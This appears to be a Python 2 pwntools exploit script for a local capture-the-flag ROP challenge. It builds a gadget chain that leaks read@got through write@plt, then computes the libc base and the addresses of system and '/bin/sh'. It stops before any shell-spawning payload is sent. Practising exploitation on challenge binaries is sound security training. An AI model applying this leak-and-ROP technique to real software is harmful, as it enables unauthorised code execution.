from pwn import *
import sys

# preload content
####################
context.binary = "./challenge"
binary = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")	# ld_preload	

# plt, got, functions
#####################
write_plt	= p64(binary.symbols["write"])
read_plt	= p64(binary.symbols["read"])
read_got	= p64(binary.symbols["got.read"])
main		= p64(binary.symbols["main"])
pop_rdi = 0x4005a9
pop_rsi = 0x4005ab
pop_rdx = 0x4005ad
pop_rax = 0x4005a7

#r = remote("127.0.0.1", 1337)
#r = gdb.debug("./challenge", "break *0x4005a9")
#r = gdb.attach(r, "break write")
r = process(["./challenge"], env={"LD_PRELOAD": "./rop2_libc.so"})
#r = process("./challenge")

print r.recvline()


# Memleak - write@plt memleaks read@got
payload = ""
payload += "A" * 16
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(pop_rsi)
payload += read_got
payload += p64(pop_rdx)
payload += p64(0x8)
payload += write_plt

r.sendline(payload)

# leak offset & calculate libc offsets
leak = int(r.recv(8)[::-1].encode("hex"),16)
libc_base = leak - libc.symbols["read"]
system = int(libc_base + libc.symbols["system"])
binsh = int(libc_base + libc.search("/bin/sh").next())

print "[+] Leak: 0x%x" % leak
print "[+] libc: 0x%x" % libc_base
print "[+] system: 0x%x" % system
print "[+] binsh: 0x%x" % binsh



